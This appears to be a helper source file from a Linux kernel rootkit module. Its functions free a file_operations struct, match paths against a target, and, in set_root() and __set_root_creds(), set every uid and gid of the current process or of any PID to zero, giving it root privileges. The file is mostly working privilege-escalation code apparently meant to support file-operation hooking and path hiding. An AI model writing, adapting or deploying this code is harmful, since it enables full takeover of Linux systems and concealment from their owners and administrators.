#include <linux/kernel.h>
#include <linux/file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/uidgid.h>
#include <linux/binfmts.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/user_namespace.h>
#include <linux/rcupdate.h>
/* Cleanup fops struct*/
static void cleanup_fops(struct file_operations *fops) {
    kfree(fops);
}

/* Checks if path matches target */
bool is_bad_path(const char *full_path, const char *target, size_t n) {
    size_t fp_len;
    size_t t_len;
    if (!full_path || !target) {
        return true; // pointer is NULL
    }
    // simple bounds checking
    fp_len = strlen(full_path);
    t_len = strlen(target);

    if (n > fp_len || n > t_len) {
        return true;
    }

    return strncmp(full_path, target, n) != 0;
}

/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
bool is_bad_fd(const int fd) {
    return fd < 3;
}

/* Set given credentials to root (does not commit creds for you!) */
void __set_root_creds(struct cred *cred) {
    cred->uid.val = cred->gid.val = 0;
    cred->euid.val = cred->egid.val = 0;
    cred->suid.val = cred->sgid.val = 0;
    cred->fsuid.val = cred->fsgid.val = 0;
}


/* Wrapper for __set_root_creds */
void set_root(pid_t pid)
{
    struct pid *pid_struct;
    struct task_struct *task;
    struct cred *task_cred;

    if (pid) {
        // Set credentials of process from PID
        pid_struct = find_get_pid(pid);
        task = pid_task(pid_struct, PIDTYPE_PID);
        if (task) {
            task_lock(task);
            
            task_cred = rcu_dereference((task)->cred);
            __set_root_creds(task_cred);

            task_unlock(task);
            put_pid(pid_struct);
        }
        
    } else {
      task_cred = prepare_creds();
      if (!task_cred) {
        return;
      }
      __set_root_creds(task_cred);
      // Set credentials of current process
      commit_creds(task_cred);
    }
}